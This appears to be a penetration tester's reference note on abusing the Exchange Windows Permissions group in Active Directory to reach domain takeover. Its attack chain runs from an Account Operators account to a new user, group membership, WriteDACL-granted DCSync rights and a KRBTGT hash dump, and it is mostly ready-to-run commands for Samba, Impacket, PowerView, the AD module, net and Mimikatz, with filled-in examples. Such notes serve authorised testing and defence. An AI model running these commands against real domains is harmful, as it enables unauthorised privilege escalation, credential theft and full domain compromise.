---
Primary_category: "[[EXCHANGE GROUPS]]"
title: "EXCHANGE WINDOWS PERMISSIONS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[EXCHANGE GROUPS]]

#### *Theory*

When a *Microsoft Exchange Service* is installed on a *Windows Machine*, several *exchange-related* new groups are created in the domain

Some of these groups are granted with certain rights that makes them privileged groups within the *AD Enviroment*

One of them is the *Exchange Windows Permissions* group. This group is not listed as a *Protected Group (i.e. adminCount=0)*, but members are granted the ability to write any *ACE ([[GRANT RIGHTS (WRITEDACL)|WriteDACL]]*) within the *domain object's DACL*

Therefore, an operator with control over a domain user account belonging to this *Exchange group*, could grant itself or to another account rights, such as *DC-Replication-Get-Changes* and *DC-Replication-Get-Changes-All*, in order to perform a *DCSync* against the domain

Since this group's *ACL* is applied to the domain, *inheritance* can be enabled when applying any *ACE*, affecting any domain child object i.e. user accounts, groups, computer accounts, *GPOs* and so on. Therefore, we can essentially take over any object within the domain

An adversary can add domain user accounts to this group either by abusing a *DACL* missconfigutation or by leveraging a compromised account that is member of the *[[ACCOUNT OPERATORS|Account Operators]] [[WINDOWS SECURITY GROUPS|built-in group]]*

Without going into detail, any member belonging to the latter has the capacity of adding a user account to a *non-protected group* and change the password of any *non-protected* domain user account

Take into account that being able to compromise an *Exchange Server* is a **BIG WIN** as this often leads to domain admin privileges

In addition to this, dumping *cached credentials* from an *Exchange Server* will produce dozens or hundreds of cleartext credentials or *NT hashes*. This happens since users authenticate with its domain credentials to the *Outlook Web Access*, running on the *Exchange Server*

---

#### *Abuse - UNIX-like*

Let's suppose we have managed to compromise a domain account belonging to the *Account Operators built-in group* and we realize that there is a *Exchange Service* installed on the *Domain Controller*

Since this service is installed in the domain, several privileged groups are created such as *Exchange Windows Permissions* and *Organization Management*

Therefore, we could leverage the privileges of this group in order to add this account or another compromised account to the *Exchange Windows Permissions* group

After that, we would have the sufficient rights to grant *DCSync* rights over the domain object and dump sensitive information for any domain account


##### *Adding a new Domain User Account*

We have control over a domain account belonging to the *Account Operators* group. So, first, let's create a new user account by leveraging the privileges of this group

###### *Net RPC (Samba Suite)*

> ***[Net RPC](https://www.samba.org/samba/docs/current/man-html/net.8.htmlj)***

```bash
net rpc user add '<NEW_USER>' '<PASSWD>' -U '<CONTROLLED_USER>%<PASSWD>' -S '<DC>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> net rpc user add 'john.doe' 'password1234$!' -U 'john.snow%WinterIsComing99!' -S 'THEWALL.GOT.LOCAL'
> ```
>

##### *Adding a User Account to the Exchange Windows Permissions group*

Likewise, any member of the *Account Operators* group can add a user account to a *non-protected group*, such as the *Exchange Windows Permissions*

Therefore, simply leverage the controlled user account to add the account we created earlier to the mentioned group

###### *Net RPC (Samba Suite)*

> ***Net RPC***

```bash
net rpc group addmem '<GROUP>' '<NEW_USER>' -U '<CONTROLLED_USER>%<PASSWD>' -S '<DC>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> net rpc group addmem 'Exchange Windows Permissions' 'john.doe' -U 'john.snow%WinterIsComing99!' -S 'THEWALL.GOT.LOCAL'
> ```
>

##### *Granting DCSync Rights over the Domain Object through DACL Abuse (WriteDACL)*

Once the user account has been created and added to the *Exchage Windows Permissions* group by leveraging the *Account Operators* membership, it will have *WriteDACL* rights over the *domain object* due to belonging to the mentioned *Exchange* group

Thus, an operator could authenticate as this user account in order to grant *DS-Replication-Get-Changes* and *DS-Replication-Get-Changes-All* (i.e. *DCSync rights*) rights to itself or another controlled user

To do so, we can proceed as follows

###### *Impacket's DACLedit.py*

> ***[DACLedit.py](https://github.com/fortra/impacket/blob/master/examples/dacledit.py)***

```bash
dacledit.py -dc-ip '<DC>' -principal '<CONTROLLED_USER> -target-dn 'DC=<DOMAIN>,DC=<TLD>' -action write -rights 'DCSync' '<DOMAIN>/<USER>:<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> dacledit.py -dc-ip 'THEWALL.GOT.LOCAL' -principal 'john.snow' -target-dn 'DC=GOT,DC=LOCAL' -action write -rights 'DCSync' 'GOT.LOCAL/john.doe:password1234$!'
> ```
>

- ***Checking DCSync rights over domain object***

> ***DACLedit.py***

```bash
dacledit.py -dc-ip '<DC>' -principal '<CONTROLLED_USER>' -target-dn 'DC=<DOMAIN>,DC=<TLD>' -action read '<DOMAIN>/<USER>:<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> dacledit.py -dc-ip 'THEWALL.GOT.LOCAL' -principal 'john.snow' -target-dn 'DC=GOT,DC=local' -action read 'GOT.LOCAL/john.doe:password1234$!'
> ```
>

##### *Performing a DCSync Attack*

> ***[[DCSYNC|DCSync]]***

We currently have control over an account for which we have granted *DCSync* rights as we mentioned

From there, we could retrieve all the sensitive information for the *KRBTGT* user account such as *NT hash* or *AES keys* in order to perform a *[[GOLDEN TICKETS|Golden Ticket]]* attack

Remember that a domain takeover can be easily accomplished once an adversary have compromised the *KRBTGT* account as all the *Ticket Granting Tickets* generated by the *KDCs* are signed-then-encrypted by using a key derived from the password of this built-in account

###### *Impacket's Secretsdump.py*

> ***[Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

```bash
secretsdump.py -just-dc-user 'krbtgt' '<DOMAIN>/<USER>:<PASSWD>@<DC>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> secretsdump.py -just-dc-user 'krbtgt' 'GOT.LOCAL/john.snow:WinterIsComing99!@THEWALL.GOT.LOCAL'
> ```
>

---

#### *Abuse - Windows*

If we are constrained to a *Windows Box* during an assessment, all the mentioned *TTPs* can be carried out as well

##### *Adding a new Domain User Account*

###### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***

> ***New-DomainObject***

```powershell
$securePass = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $securePass)
```

```powershell
$pass = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
New-DomainUser -Credential $cred -SamAccountName '<NEW_USER>' -AccountPassword $pass
```

> [!DANGER]- *e.g.*
>
> ```powershell
> $securePass = ConvertTo-SecureString -AsPlainText -Force -String 'WinterIsComing99!'
> ```
>
> ```powershell
> $cred = New-Object System.Management.Automation.PSCredential('GOT.LOCAL\john.snow', $securePass)
> ```
>
> ```powershell
> $pass = ConvertTo-SecureString -AsPlainText -Force -String 'password1234$!'
> ```
>
> ```powershell
> New-DomainUser -Credential $cred -SamAccountName 'john.doe' -AccountPassword $pass
> ```
>

- ***Verifying the created User Account***

> ***Get-DomainUser***

```powershell
Get-DomainUser -Identity '<NEW_USER>' | Select samAccountName
```

> [!DANGER]- *e.g.*
>
> ```powershell
> Get-DomainUser -Identity 'john.doe' | Select samAccountName
> ```
>

###### *Powershell AD Module*

> ***[Powershell AD Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps)***

> ***New-ADUser***

```powershell
$securePass = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $securePass)
```

```powershell
$pass = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
New-ADUser -Credential $cred -Name '<NEW_USER>' -SamAccountName '<NEW_USER>' -AccountPassword $pass
```

> [!DANGER]- *e.g.*
>
> ```powershell
> $securePass = ConvertTo-SecureString -AsPlainText -Force -String 'WinterIsComing99!'
> ```
>
> ```powershell
> $cred = New-Object System.Management.Automation.PSCredential('GOT.LOCAL\john.snow', $securePass)
> ```
>
> ```powershell
> $pass = ConvertTo-SecureSTring -AsPlainText -Force -String 'password1234$!'
> ```
>
> ```powershell
> New-ADUser -Credential $cred -Name 'john.doe' -SamAccountName 'john.doe' -AccountPassword $pass
> ```
>

- ***Verifying the created User Account***

> ***Get-ADUser***

```powershell
Get-ADUser -Identity '<USER>' | Select samAccountName
```

> [!DANGER]- *e.g.*
>
> ```powershell
> Get-ADUser -Identity 'john.doe' | Select samAccountName
> ```
>

###### *Net Command*

> ***Less OPSEC***

```bash
runas.exe /netonly /user:<USER>@<DOMAIN> powershell.exe # Or cmd.exe
```

```bash
net user /domain /add /active:yes '<USER>' '<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> runas.exe /netonly /user:john.snow@GOT.LOCAL powershell.exe
> ```
>
> ```bash
> net user /domain /add /active:yes 'john.doe' 'password1234$!'
> ```
>

- ***Verifying the created User Account***

```bash
net user /domain '<USER>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> net user /domain 'john.doe'
> ```
>

##### *Adding a User Account to the Exchange Windows Permissions group*

###### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***

```powershell
$securePass = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $securePass)
```

```powershell
$pass = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
Add-DomainGroupMember -Credential $cred -Identity '<GROUP>' -Member '<USER>'
```

> [!DANGER]- *e.g.*
>
> ```powershell
> $securePass = ConvertTo-SecureString -AsPlainText -Force -String 'WinterIsComing99!'
> ```
>
> ```powershell
> $cred = New-Object System.Management.Automation.PSCredential('GOT.LOCAL/john.snow', $securePass)
> ```
>
> ```powershell
> Add-DomainGroupMember -Credential $cred -Identity 'Exchange Windows Permissions' -Member 'john.doe'
> ```
>

- ***Listing the Members of the given Domain Group***

> ***Get-DomainGroupMember***

```powershell
Get-DomainGroupMember -Identity '<GROUP>' | Select memberName
```

> [!DANGER]- *e.g.*
>
> ```powershell
> Get-DomainGroupMember -Identity 'Exchange Windows Permissions' | Select memberName
> ```
>

> ***Get-DomainGroup***

```powershell
Get-DomainGroup -Identity '<GROUP>' | Select member | fl
```

> [!DANGER]- *e.g.*
>
> ```powershell
> Get-DomainGroup -Identity 'Exchange Windows Permissions' | Select member | fl
> ```
>

###### *Net Command*

> ***Less OPSEC***

```bash
runas.exe /netonly /user:<USER>@<DOMAIN> powershell.exe # Or cmd.exe
```

```bash
net localgroup /domain /add '<GROUP>' '<USER>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> runas.exe /netonly /user:john.snow@GOT.LOCAL powershell.exe
> ```
>
> ```bash
> net localgroup /domain /add 'Exchange Windows Permissions' 'john.doe'
> ```
>

- ***Listing the Members of the given Domain Group***

```bash
net localgroup /domain '<GROUP>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> net localgroup /domain '<GROUP>'
> ```
>

##### *Granting DCSync Rights over the Domain Object through DACL Abuse (WriteDACL)*

###### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***

> ***Add-DomainObjectACL***

```powershell
$securePass = ConvertTo-SecureString -AsPlainText -Force -String '<PASSWD>'
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $securePass)
```

```powershell
Add-DomainObjectACL -Credential $cred -PrincipalIdentity '<CONTROLLED_USER>' -TargetIdentity 'DC=<DOMAIN>,DC=<TLD>' -Rights 'DCSync' -Verbose
```

> [!DANGER]- *e.g.*
>
> ```powershell
> $securePass = ConvertTo-SecureString -AsPlainText -Force -String 'password1234$!'
> ```
>
> ```powershell
> $cred = New-Object System.Management.Automation.PSCredential('GOT.LOCAL\john.doe', $securePasss)
> ```
>
> ```powershell
> Add-DomainObjectACL -Credential $cred -PrincipalIdentity 'john.snow' -TargetIdentity 'DC=GOT,DC=LOCAL' -Rights 'DCSync' -Verbose
> ```
>

- ***Listing the Domain Object DACL for a given User Account***

```powershell
$sid = Convert-NameToSid '<USER>'
$sid = Get-DomainUser -Identity '<USER>' | Select -ExpandProperty objectSID
```

```powershell
Get-DomainObjectACL -Identity 'DC=<DOMAIN>,DC=<TLD>' -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $sid }
```

> [!DANGER]- *e.g.*
>
> ```powershell
> $sid = Convert-NameToSid 'john.snow'
> $sid = Get-DomainUser -Identity 'john.snow' | Select -ExpandProperty objectSID
> ```
>
> ```powershell
> Get-DomainObjectACL -Identity 'DC=GOT,DC=LOCAL' -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $sid }
> ```
>

##### *Performing a DCSync Attack*

###### *Mimikatz*

> ***[Mimikatz.exe](https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe)***

```bash
.\mimikatz.exe 'lsadump::dcsync /user:<USER> /domain:<DOMAIN> /dc:<DC>' exit
```

> [!DANGER]- *e.g.*
>
> ```bash
> .\mimikatz.exe 'lsadump::dcsync /user:krbtgt /domain:GOT.LOCAL /dc:THEWALL.GOT.LOCAL' exit
> ```
>